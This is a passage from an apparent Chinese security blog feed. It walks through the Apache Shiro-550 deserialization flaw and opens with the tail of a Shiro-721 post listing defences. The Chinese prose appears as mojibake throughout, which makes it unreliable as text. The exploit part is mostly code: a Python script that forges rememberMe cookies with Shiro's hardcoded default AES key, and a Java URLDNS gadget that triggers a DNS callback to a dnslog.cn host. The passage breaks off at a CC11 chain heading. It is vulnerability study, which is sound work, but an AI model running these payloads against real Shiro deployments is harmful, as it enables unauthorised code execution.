ÈîôËØØÔºåÊúçÂä°Âô®ËøîÂõû <code>Set-Cookie: rememberMe=deleteMe</code></li></ul><h2 id="Èò≤Âæ°ÊñπÂºè"><a href="#Èò≤Âæ°ÊñπÂºè" class="headerlink" title="Èò≤Âæ°ÊñπÂºè"></a>Èò≤Âæ°ÊñπÂºè</h2><ol><li>Áî±‰∫éËøôÁßçÊñπÊ≥ïÈúÄË¶ÅÁàÜÁ†¥ÂæóÂà∞keyÔºåÂõ†Ê≠§ÂèØ‰ª•ÂØπÁü≠Êó∂Èó¥ÂÜÖÂ§öÊ¨°ËÆøÈóÆÁöÑipËøõË°åÁ¶ÅÊ≠¢ËÆøÈóÆÊìç‰ΩúÔºåËææÂà∞Èò≤Âæ°ÁõÆÁöÑ„ÄÇ</li><li>ÂçáÁ∫ßËá≥ÂÆâÂÖ®ÁâàÊú¨„ÄÇ</li><li>ÂÖ≥Èó≠rememberMeÊåÅ‰πÖÂåñÁôªÂΩïÂäüËÉΩ„ÄÇ<br>ÂèÇËÄÉÂÄüÈâ¥Ôºö<br><a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E5%9C%A8-shiro721-%E4%B8%AD%E7%9A%84-Padding-Oracle-Attack">JavaÂèçÂ∫èÂàóÂåñShiroÁØá02-Shiro721ÊµÅÁ®ãÂàÜÊûê | Drunkbaby‚Äôs Blog (drun1baby.top)</a><br><a href="https://goodapple.top/archives/261">JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥û‚Äî‚ÄîShiro721 - Êû´„ÅÆBlog (goodapple.top)</a><a href="https://blog.csdn.net/qq_41874930/article/details/121314926">shiro 721 ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ§çÁé∞‰∏éÂéüÁêÜ‰ª•ÂèäPadding Oracle AttackÊîªÂáªÂä†Ëß£ÂØÜÂéüÁêÜ_shiroÂèçÂ∫èÂàóÂåñÂéüÁêÜ_Shanfenglan7ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãShiro550</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro550/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro550/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><ul><li>jdk8u65</li><li><a href="https://tomcat.apache.org/download-80.cgi">Tomcat8</a></li><li>shiro 1.2.4<br>ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨ÔºöShiro &lt;&#x3D; 1.2.4<br>ÁéØÂ¢ÉÂÖ∑‰ΩìÁöÑÈÖçÁΩÆÂèÇËÄÉÔºö<a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">JavaÂèçÂ∫èÂàóÂåñShiroÁØá01-Shiro550ÊµÅÁ®ãÂàÜÊûê | Drunkbaby‚Äôs Blog (drun1baby.top)</a></li></ul><h2 id="shiro-550ÂàÜÊûê"><a href="#shiro-550ÂàÜÊûê" class="headerlink" title="shiro-550ÂàÜÊûê"></a>shiro-550ÂàÜÊûê</h2><p>ÂìéÔºåÁªà‰∫éÂà∞‰∫ÜshiroÔºåËôΩÁÑ∂ÂæàÂ∞ëÈÅáÂà∞Ëøô‰∏™ÊºèÊ¥û‰ΩÜÊòØËøô‰∏™ËøòÊòØÊå∫ÈáçË¶ÅÁöÑ<br>Êäì‰∏™ÁôªÂΩïÁöÑÂåÖÔºåÂãæÈÄâ RememberMe Â≠óÊÆµ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171119869.png" alt="image-20230717111933757"><br>ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™cookieÊòéÊòæÊòØÈÄöËøáÂä†ÂØÜÁöÑÔºåÈÇ£‰πàÂ∞±ÂéªÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™cookieÁöÑÁîüÊàêËøáÁ®ãÔºåidaeÈáåÈù¢Êåâ‰∏§‰∏ãshiftÂèØ‰ª•ËæìÂÖ•cookieÁÑ∂Âêé‰ºöÊääÂíåcookieËøô‰∏™ÂêçÂ≠óÊúâÂÖ≥ÁöÑÁ±ªÂàóÂá∫Êù•ÔºåÊúÄÁªàÊàë‰ª¨ÊâæÂà∞‰∫Ü<code>CookieRememberMeManager</code>Á±ª‰∏≠ÁöÑ <code>getRememberedSerializedIdentity()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171120300.png" alt="image-20230717112028101"><br>Ëøô‰∏™ÊñπÊ≥ïÂÖàÂà§Êñ≠ÊòØÂê¶‰∏∫httpËØ∑Ê±ÇÔºåÂ¶ÇÊûúÊòØÂàô‰ºöËé∑Âèñremember meÁöÑcookieÂÄºÔºåÁÑ∂ÂêéÂà§Êñ≠ÊòØÂê¶ÊòØdeleteMeÔºå‰∏çÊòØÂàôÂà§Êñ≠ÊòØÂê¶ÊòØÁ¨¶Âêà base64 ÁºñÁ†ÅÔºåÁÑ∂ÂêéÂÜçÂØπÂÖ∂ËøõË°å base64 Ëß£Á†ÅÔºåÂ∞ÜËß£Á†ÅÁªìÊûúËøîÂõûÔºåÈÇ£‰πàÂæÄ‰∏äÊâæË∞ÅË∞ÉÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171120849.png" alt="image-20230717112037436"><br>ÊâæÂà∞‰∫Ü<code>AbstractRememberMeManager</code> Ëøô‰∏™Á±ªÁöÑ <code>getRememberedPrincipals()</code> ÊñπÊ≥ïÔºåËøôÈáåË¶ÅÊääÂØπÂ∫îÁöÑÊ∫êÁ†Å‰∏ãËΩΩfind usagesÊâçËÉΩÊêúÂà∞ÔºåËøô‰∏™ÊñπÊ≥ïÁöÑ‰ΩúÁî®Âüü‰∏∫ <strong>PrincipalCollection</strong>Ôºå‰∏ÄËà¨Â∞±ÊòØÁî®‰∫éËÅöÂêàÂ§ö‰∏™ Realm ÈÖçÁΩÆÁöÑÈõÜÂêà„ÄÇ393Ë°åÂ∞Ü HTTP Requests ÈáåÈù¢ÁöÑ Cookie ÊãøÂá∫Êù•ÔºåËµãÂÄºÁªô bytes Êï∞ÁªÑÔºõ396 Ë°åÂ∞Ü bytes Êï∞ÁªÑÁöÑ‰∏úË•øËøõË°å <code>convertBytesToPrincipals()</code> ÊñπÊ≥ïÁöÑË∞ÉÁî®ÔºåÂπ∂Â∞ÜÂÄºËµãÁªô principals ÂèòÈáèÔºå<code>convertBytesToPrincipals</code>ÊñπÊ≥ïÂ∞Ü‰πãÂâçÁöÑ bytes Êï∞ÁªÑËΩ¨Êç¢Êàê‰∫ÜËÆ§ËØÅ‰ø°ÊÅØÔºåÂπ∂‰∏îÂØπÂÖ∂ËøõË°åËß£ÂØÜÂíåÂèçÂ∫èÂàóÂåñ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121265.png" alt="image-20230717112102085"></p><h3 id="decrypt-Ëß£ÂØÜ"><a href="#decrypt-Ëß£ÂØÜ" class="headerlink" title="decrypt()Ëß£ÂØÜ"></a>decrypt()Ëß£ÂØÜ</h3><p>Êàë‰ª¨Ë∑üËøõ‰∏Ä‰∏ã<code>decrypt()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121435.png" alt="image-20230717112126287"><br>487 Ë°åËøôÈáåËé∑Âèñ‰∫ÜÂØÜÈí•ÊúçÂä°ÔºåÂÜçÂæÄÂêé 489 Ë°åÁöÑ <code>decrypt()</code> Ë∑üËøõÂéªÔºåÂèëÁé∞ÂÆÉÊòØ‰∏Ä‰∏™Êé•Âè£„ÄÇÊàë‰ª¨ÂèØ‰ª•Áúã‰∏Ä‰∏ãÂÆÉÁöÑÂèÇÊï∞ÂêçÁ¨¨‰∏Ä‰∏™Ë¶ÅÂä†ÂØÜÁöÑÊï∞ÁªÑÔºåÁ¨¨‰∫å‰∏™ÊòØ‰∏Ä‰∏™ keyÔºåËØ¥ÊòéËøôÊòØ‰∏Ä‰∏™ÂØπÁß∞Âä†ÂØÜ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121534.png" alt="image-20230717112158412"><br>ÂõûÂà∞‰πãÂâç <code>decrypt()</code> ÊñπÊ≥ïÁöÑÁ¨¨ 489 Ë°åÔºå‰∏§‰∏™‰º†ÂèÇÔºåÁ¨¨‰∏Ä‰∏™ÊòØÂä†ÂØÜÂ≠óÊÆµÔºåÁ¨¨‰∫å‰∏™ÊòØ keyÔºåË∑üËøõ‰º†ÂÖ•ÁöÑ <code>getDecryptionCipherKey()</code>ÊúÄÁªàÂèëÁé∞ÂÆÉÊòØ‰∏Ä‰∏™ËøîÂõûÁöÑÂ∏∏Èáè<code>decryptionCipherKey</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122240.png" alt="image-20230717112212188"><br>ÁÑ∂Âêéfind usagesÂØªÊâæÂì™ÈáåË∞ÉÁî®‰∫ÜÂÆÉÔºåÂú®ÂêåÁ±ª‰∏ãÁöÑ<code>setDecryptionCipherKey()</code>ÈáåÊâæÂà∞‰∫ÜÂÆÉÁöÑË∞ÉÁî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122098.png" alt="image-20230717112221010"><br>ÁÑ∂ÂêéÂÜçÊâæ‰∏Ä‰∏ã<code>setDecryptionCipherKey()</code>ÁöÑË∞ÉÁî®ÔºåÂú®ÂêåÁ±ª‰∏ãÁöÑ<code>setCipherKey()</code>ÊñπÊ≥ï‰∏≠Ë∞ÉÁî®‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122213.png" alt="image-20230717112229102"><br>ÁÑ∂ÂêéÁªßÁª≠ÁúãÂì™ÈáåË∞ÉÁî®‰∫Ü<code>setCipherKey()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122886.png" alt="image-20230717112241693"><br>Âà∞ËøôÈáåË∑üËøõÂéªÂèëÁé∞<code>DEFAULT_CIPHER_KEY_BYTES</code>ÊòØ‰∏™Âõ∫ÂÆöÁöÑÂÄº<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122054.png" alt="image-20230717112257933"><br>‰πüÂ∞±ÊòØËØ¥Âú®Shiro1.2.4 Âèä‰πãÂâçÁöÑÁâàÊú¨‰∏≠ÂØπremember meÂä†ÂØÜÁöÑkeyÊòØ‰∏Ä‰∏™Âõ∫ÂÆöÁöÑkeyÔºåÂÖ∂ÂÆûÂä†ÂØÜÁÆóÊ≥ïÂ∞±ÊòØAESÂä†ÂØÜ</p><h3 id="deserializeÂèçÂ∫èÂàóÂåñ"><a href="#deserializeÂèçÂ∫èÂàóÂåñ" class="headerlink" title="deserializeÂèçÂ∫èÂàóÂåñ"></a>deserializeÂèçÂ∫èÂàóÂåñ</h3><p>Êù•Âà∞‰∏ÄÂºÄÂßãÁöÑ<code>convertBytesToPrincipals()</code>ÊñπÊ≥ïÊâæÂà∞<code>deserialize()</code>ÊñπÊ≥ïÁÇπËøõÊù•Âà∞‰∏ãÈù¢ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123340.png" alt="image-20230717112312266"><br>ËøôÈáåÂÜçÁÇπËøõÂéªÂÖ∂ÂÆûÊòØ‰∏Ä‰∏™Êé•Âè£ÔºåÁÑ∂ÂêéÁªßÁª≠Êü•ÁúãÂì™ÈáåË∞ÉÁî®‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123313.png" alt="image-20230717112319911"><br>Âú®shiroÂåÖÁöÑ<code>deserialize</code>ÊñπÊ≥ï‰∏≠Ë∞ÉÁî®‰∫Ü<code>readObject()</code>ÊñπÊ≥ïÂêéÈù¢Â∞±‰ºöËøõÂà∞HashMapËøôÂ∞±ÊòØ‰∏Ä‰∏™ÂæàÂ•ΩÁöÑÂÖ•Âè£ÔºåÂà∞ËøôÈáåËß£ÂØÜÁöÑËøáÁ®ãÂ∞±ÁªìÊùü‰∫ÜÔºåÊé•‰∏ãÊù•ÂéªË∑ü‰∏Ä‰∏ãÂä†ÂØÜÁöÑËøáÁ®ã</p><h3 id="Âä†ÂØÜ"><a href="#Âä†ÂØÜ" class="headerlink" title="Âä†ÂØÜ"></a>Âä†ÂØÜ</h3><p>Âä†ÂØÜÈÄöËøáË∞ÉËØïÊù•ÂàÜÊûêÔºåÊñ≠ÁÇπ‰∏ãÂú®Â¶Ç‰∏ãÂõæ<code>onSuccessfulLogin()</code>‰ΩçÁΩÆ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123238.png" alt="image-20230717112334025"><br>ËøôÈáåÊÄé‰πàËøõÂà∞Ëøô‰∏™Êñ≠ÁÇπÂë¢ÔºüÂ∞±ÊòØÊàë‰ª¨Âú®‰∏ÄÂºÄÂßãÁôªÂΩïÁöÑÈ°µÈù¢ÂºÄÂêØ‰ª£ÁêÜ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123328.png" alt="image-20230717112344273"><br>ÂΩìÊñ≠ÁÇπ‰∏ãÂ•Ω‰πãÂêéÁÇπÂáªsign inÂç≥ÂèØÂà∞Êñ≠ÁÇπ‰ΩçÁΩÆÔºåÂΩìÁÑ∂‰πüÂèØÁî®burpÂèëÂåÖÂºÄÂßãË∞ÉËØïÔºåÂú®Â¶Ç‰∏ã‰ΩçÁΩÆÂØπÊòØÂê¶ÁÇπÂáª‰∫ÜRemember MeËøõË°åÂà§Êñ≠ÔºåÂ¶Ç‰∏ãÁÇπÂáª‰∫Ü‰ºöÂ∞ÜrememberMeËµãÂÄº‰∏∫true<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124686.png" alt="image-20230717112404419"><br>ÁÑ∂ÂêéÂà∞Ëøô‰∏™rememberIdentityÊñπÊ≥ïÔºåËøôÈáåÂ∞±ÊòØÁî®‰∫éÁî®Êà∑ÂêçËµãÂÄº‰øùÂ≠òÔºåÂèØ‰ª•ÁúãÂà∞ËøôÈáå‰∏ÄÁ≥ªÂàóË∞ÉÁî®ÂÆå‰πãÂêéÂæóÂà∞‰∫ÜÁî®Êà∑Âêç<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124274.png" alt="image-20230717112417095"><br>ÁÑ∂ÂêéËøõÂÖ•Âà∞rememberIdentityÊñπÊ≥ïÁªßÁª≠Áúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124709.png" alt="image-20230717112426588"><br>ËøôÈáåÁöÑconvertPrincipalsToBytesÂíå‰πãÂâçËß£ÂØÜÁöÑ<code>convertBytesToPrincipals()</code>ÈùûÂ∏∏Áõ∏‰ºº‰∏çËøáËß£ÂØÜÂèò‰∏∫‰∫ÜÂä†ÂØÜÔºåÂèçÂ∫èÂàóÂåñÂèò‰∏∫‰∫ÜÂ∫èÂàóÂåñ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124313.png" alt="image-20230717112440188"><br>ÁÑ∂ÂêéËøõÂÖ•Âà∞Â∫èÂàóÂåñÁöÑËøôÈáåÔºàÂà∞‰∏äÈù¢Ëøô‰∏ÄÊ≠•‰πãÂêé‰∏ÄÁõ¥F7Â∞±Ë°åÔºâÂèØ‰ª•ÁúãÂà∞ÂíåÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏ÄÊ†∑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124472.png" alt="image-20230717112451267"><br>ÁÑ∂ÂêéÂõûÂà∞ encrypt Âä†ÂØÜËøôÈáåÔºåËøõÂÖ•<code>getEncryptionCipherKey()ÊñπÊ≥ï</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125880.png" alt="image-20230717112500712"><br>‰∏ÄÁõ¥Ë∑ü‰∏ãÂéª‰πãÂêéÂèëÁé∞ÊúÄÂêéË∞ÉÁî®ÁöÑkeyÂ∞±ÊòØÊàë‰ª¨‰πãÂâçÊâæÂà∞ÁöÑÈÇ£‰∏™Â∏∏Èáè<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125038.png" alt="image-20230717112509939"><br>cookieÈÄöËøáAESÂä†ÂØÜ‰πãÂêéÂÜçbase64ÂæóÂà∞ÔºåÂà∞ËøôÈáåÂ∑Æ‰∏çÂ§öÂàÜÊûêÁªìÊùü</p><h2 id="Shiro-550-ÊºèÊ¥ûÂà©Áî®"><a href="#Shiro-550-ÊºèÊ¥ûÂà©Áî®" class="headerlink" title="Shiro-550 ÊºèÊ¥ûÂà©Áî®"></a>Shiro-550 ÊºèÊ¥ûÂà©Áî®</h2><p>ËøôÈáåÁî®‰∫Ü‰∏Ä‰∏™Êèí‰ª∂Âêç‰∏∫Maven HelperÂàÜÊûêpom.xml<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125398.png" alt="image-20230717112524077"><br>ÂÖ∂ÂÆûËøôÈáåÊúâÂæàÂ§öÂåÖÂú®test‰∏ãÔºåÁúãÁªÑÈïøÁöÑËßÜÈ¢ëËØ¥testÊòØÊâì‰∏çÂà∞ÁöÑÔºå‰ΩÜÊòØ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÊàëÁöÑÊèí‰ª∂Ê≤°ÊúâÊòæÁ§∫ÂæàÂ•áÊÄ™</p><h3 id="URLDNSÈìæ"><a href="#URLDNSÈìæ" class="headerlink" title="URLDNSÈìæ"></a>URLDNSÈìæ</h3><p>ËøôÈáåÊàë‰ª¨ÁöÑÊîªÂáªÊÄùË∑ØÂ∞±ÊòØÁõ¥Êé•ÊõøÊç¢Âä†ÂØÜÂêéÁöÑcookieÔºåÈÇ£‰πàÂ∞±ÈúÄË¶Å‰∏Ä‰∏™Âä†ÂØÜÁöÑËÑöÊú¨ÔºåËøôÈáåÁõ¥Êé•Áî®DrunkbabyÂ∏àÂÇÖÁöÑËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ôºç*-* coding:utf-8  </span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36  </span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby  </span></span><br><span class="line"><span class="comment"># @FileName: poc.py  </span></span><br><span class="line"><span class="comment"># @Software: VSCode  </span></span><br><span class="line"><span class="comment"># @Blog    Ôºöhttps://drun1baby.github.io/  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base  </span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> mode  </span><br><span class="line"><span class="keyword">import</span> uuid  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):  </span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">  data = f.read()  </span><br><span class="line"> <span class="keyword">return</span> data  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):  </span><br><span class="line"> BS = AES.block_size  </span><br><span class="line"> pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()  </span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>  </span><br><span class="line"> mode = AES.MODE_CBC  </span><br><span class="line"> iv = uuid.uuid4().<span class="built_in">bytes</span>  </span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)  </span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))  </span><br><span class="line"> <span class="keyword">return</span> ciphertext  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):  </span><br><span class="line"> enc_data = base64.b64decode(enc_data)  </span><br><span class="line"> unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]  </span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>  </span><br><span class="line"> mode = AES.MODE_CBC  </span><br><span class="line"> iv = enc_data[:<span class="number">16</span>]  </span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)  </span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])  </span><br><span class="line"> plaintext = unpad(plaintext)  </span><br><span class="line"> <span class="keyword">return</span> plaintext  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line"> data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)  </span><br><span class="line"> <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂõ†‰∏∫URLSDNSËøôÊù°Èìæ‰∏ç‰æùËµñ‰∫éCCÂåÖÔºåÊâÄ‰ª•Áî®Êù•È™åËØÅÊºèÊ¥ûÔºåÈÇ£‰πàÂÖàÂ∞ÜpayloadÈÄöËøáAESÂä†ÂØÜÁÑ∂Âêébase64ÔºåexpÂ¶Ç‰∏ãÊòØ‰πãÂâçË∑üURLDNSËøôÊù°ÈìæÂ≠êÂÜôÁöÑ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; <span class="comment">//ÂÖ•Âè£Á±ª  </span></span><br><span class="line"><span class="keyword">import</span> java.net.URL;  <span class="comment">//Ë∞ÉÁî®Èìæ‰∏≠ÁöÑÁ±ª  </span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        HashMap &lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c3j32r.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ÈÄöËøáÂèçÂ∞ÑËé∑ÂèñÂà∞url‰∏≠ÁöÑhashcodeÂ±ûÊÄß  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">//hashcode‰∏∫ÁßÅÊúâÂ±ûÊÄßÔºåÈÄöËøá‰∏ãÈù¢ÊñπÊ≥ïËÆæÁΩÆ‰∏∫ÂèØÊìç‰Ωú  </span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ËøôÈáåÂú®putÂâçÈúÄË¶ÅÂ∞ÜhashCodeÂÄºÊîπ‰∏Ä‰∏ãÔºå‰∏çÁÑ∂putÊñπÊ≥ï‰πü‰ºöËØ∑Ê±ÇdnsÔºåËøôÊ†∑‰∏çÁÆ°ÊúâÊ≤°ÊúâÂèçÂ∫èÂàóÂåñÈÉΩ‰ºöËØ∑Ê±Çdns  </span></span><br><span class="line"></span><br><span class="line">        field.set(url,<span class="number">2</span>);  <span class="comment">//ÈáçÊñ∞ËÆæÔºåÈÅøÂÖçÊ∑∑Ê∑Ü  </span></span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        field.set(url,-<span class="number">1</span>);  <span class="comment">//ÊîπÂõûÔºå‰∏çÁÑ∂ËøôÊù°ÈìæÂ∞±‰∏çËÉΩÂà©Áî®  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ËøõË°åÂ∫èÂàóÂåñ  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        w.writeObject(hashMap);</span><br><span class="line">        System.out.println(w);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ËøõË°åÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        o.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂèçÂ∫èÂàóÂåñÈÇ£ÈáåÂÖàÊ≥®ÈáäÊéâÔºåÁõ¥Êé•Â∫èÂàóÂåñÂæóÂà∞ser.binÔºåÁÑ∂ÂêéÊääËøô‰∏™Â∫èÂàóÂåñÁöÑÊï∞ÊçÆÊîæÂà∞Âä†ÂØÜËÑöÊú¨ÈáåÈù¢Ë∑ëÂæóÂà∞Âä†ÂØÜcookie<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125072.png" alt="image-20230717112539038"><br>ÊúÄÂêéÊääËøôÊÆµcookieÊõøÊç¢ÊéâÂéüÊù•ÁöÑcookieÔºå‰∏ªË¶ÅËøôÈáåÁöÑJSESSIONIDËøôÊÆµÊï∞ÊçÆ‰∏ÄÂÆöË¶ÅÂà†‰∏çÁÑ∂‰∏ç‰ºöÂéªËØªrememberMe<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125588.png" alt="image-20230717112546537"><br>ÂèëÂåÖ‰πãÂêéÊî∂Âà∞DNSËØ∑Ê±Ç<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125433.png" alt="image-20230717112554385"><br>Êé•‰∏ãÊù•Â∞±ÊòØÊç¢‰∏çÂêåÁöÑÈìæÂ∞ùËØïÊîªÂáª</p><h3 id="ÈÄöËøá-CC11-ÈìæÊîªÂáª"><a href="#ÈÄöËøá-CC11-ÈìæÊîªÂáª" class="headerlink" title="ÈÄöËøá CC11 ÈìæÊîªÂáª"></a>ÈÄöËøá CC11 